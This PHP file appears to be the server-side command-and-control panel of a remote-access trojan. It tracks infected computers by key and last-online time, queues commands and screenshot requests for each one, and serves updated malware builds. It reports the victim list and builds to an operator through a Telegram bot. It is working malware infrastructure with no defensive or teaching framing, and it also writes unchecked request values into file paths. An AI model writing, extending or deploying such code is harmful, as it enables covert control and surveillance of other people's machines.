<?php
    include('config.php');

    function sendTg($message, $tgId){
        $url = 'https://api.telegram.org/' . $GLOBALS['TgBotToken']. '/sendMessage';
        $params = array(
            'chat_id' => $tgId, 
            'text' => $message, 
            'parse_mode' => 'HTML',
        );
        $result = file_get_contents($url, false, stream_context_create(array(
            'http' => array(
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query($params)
            )
        )));
    }

    function sendTelegram($method, $response)
    {
        $ch = curl_init('https://api.telegram.org/' . $GLOBALS['TgBotToken'] . '/' . $method);  
        curl_setopt($ch, CURLOPT_POST, 1);  
        curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $res = curl_exec($ch);
        curl_close($ch);

        return $res;

    }

    function removeDirectory($dir) {
        if (file_exists($dir) && is_dir($dir)) {
        chmod($dir, 0777 );
        if ($elements = glob($dir."/*")) {
            foreach($elements as $element) {
            is_dir($element) ? removeDirectory($element) : unlink($element);
            }
        }
        rmdir($dir);
        print_r("OK");
        }
        else{
        print_r('Error! There is no such directory or it is not a directory!');
        }
    }

    if($_SERVER["REQUEST_METHOD"]=="GET"){

        if (!empty($_GET["getDatabase"])){
            $database = scandir("database");
            $string = '';
            foreach ($database as $value){
                if ($value === "." || $value === ".."){ continue; }

                $lastOnline = file_get_contents('database/' . $value . '/online');
                $comment = file_get_contents('database/' . $value . '/comment');
                $string = $string . "\n====================================\nИдентификатор: <code>" . $value . "</code>\n\nПоследний онлайн: " . $lastOnline . "\nКомментарий: " . $comment . "\n====================================\n\n\n";
            }
            sendTg("<b>База данных:</b>\n" . $string, $TgChatId);
        }

        if (!empty($_GET["setOffline"])){
            $fp = fopen('offline', "w");
            fwrite($fp, $_GET["setOffline"]);    
            fclose($fp);
        }

        if (!empty($_GET["getBuild"])){
            $resp = sendTelegram(
                'sendDocument', 
                array(
                    'chat_id' => $TgChatId,
                    'document' => curl_file_create("update/" . $FileNameToUpdate)
                )
            );

            echo $resp;
        }

        if (!empty($_GET["pcKey"]) && file_exists('database/' . $_GET["pcKey"])) {
            $pcKey = $_GET["pcKey"];
            if (!empty($_GET["setCommand"])){
                $command = $_GET["setCommand"];
                $file = 'database/' . $pcKey . '/commands'; 
                $fp = fopen($file, "a");
                fwrite($fp, $command . "\n");    
                fclose($fp);
            }

            if (!empty($_GET["setScreenshot"])){
                $file = 'database/' . $pcKey . '/getScreenshotTg';
                if (!file_exists($file)) {    
                    $fp = fopen($file, "w");
                    fwrite($fp, "1");    
                    fclose($fp);
                }
            }

            if (!empty($_GET["removeDir"])){
                removeDirectory("database/" . $pcKey);
                exit;
            }

            if (!empty($_GET["setComment"])){
                $file = 'database/' . $pcKey . '/comment';
                $comment = $_GET["setComment"];
                $fp = fopen($file, "w");
                fwrite($fp, $comment);    
                fclose($fp);
                echo "OK";
            }

            echo "SS";
        }
        else {
            echo "No such file";
        }
    }

    else if ($_SERVER["REQUEST_METHOD"]=="POST"){
        if (!empty($_POST["postUpdateVer"])) {
            move_uploaded_file($_FILES['document']['tmp_name'], "update/" . $FileNameToUpdate);
            $fp = fopen("ver", "w");
            fwrite($fp, $_POST["postUpdateVer"]);    
            fclose($fp);
        }
        print_r($_POST);
    }

?>


<!-- cringe by @loveappless -->